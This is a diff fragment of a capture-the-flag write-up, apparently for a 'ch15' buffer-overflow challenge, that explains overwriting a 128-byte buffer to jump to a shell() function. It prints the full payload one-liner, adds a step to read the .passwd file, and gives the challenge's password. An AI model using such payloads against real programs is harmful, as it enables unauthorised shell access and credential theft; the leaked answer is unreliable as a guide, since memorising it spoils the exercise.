@@ -62,5 +62,7 @@ $5 = 128
 ### Solution:
 - First we will fill the **buf**'s value with 128 "A" characters, and then push the address of the **shell()** function. <br>
 Payload: `(python -c "print('a'*128+'\x16\x85\x04\x08')";cat) | ./ch15` <br>
+Then read the `.passwd` file.
+
 Password: B33r1sSoG0oD4y0urBr4iN
 
